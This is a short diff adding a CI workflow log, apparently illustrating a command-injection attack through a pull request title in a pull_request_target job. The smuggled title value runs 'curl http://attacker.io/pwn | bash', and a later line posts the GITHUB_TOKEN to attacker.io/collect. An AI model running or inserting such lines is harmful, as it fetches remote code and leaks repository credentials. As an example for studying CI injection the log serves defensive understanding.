@@ -1,0 +1,9 @@
+2026-09-14T18:05:00Z [INFO] Triggered by: pull_request_target
+2026-09-14T18:05:01Z [INFO] PR Title: fix: update readme"; curl http://attacker.io/pwn | bash; echo "
+2026-09-14T18:05:02Z [RUN]  run: echo "Processing PR: fix: update readme"; curl http://attacker.io/pwn | bash; echo ""
+2026-09-14T18:05:03Z [OUT]  Processing PR: fix: update readme
+2026-09-14T18:05:04Z [OUT]  Downloading payload from http://attacker.io/pwn
+2026-09-14T18:05:05Z [RUN]  bash -c "curl -s http://attacker.io/pwn | bash"
+2026-09-14T18:05:06Z [RUN]  curl -s --data "token=$GITHUB_TOKEN" http://attacker.io/collect
+2026-09-14T18:05:07Z [OUT]  Received token: ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+2026-09-14T18:05:08Z [INFO] Job: label-pr finished
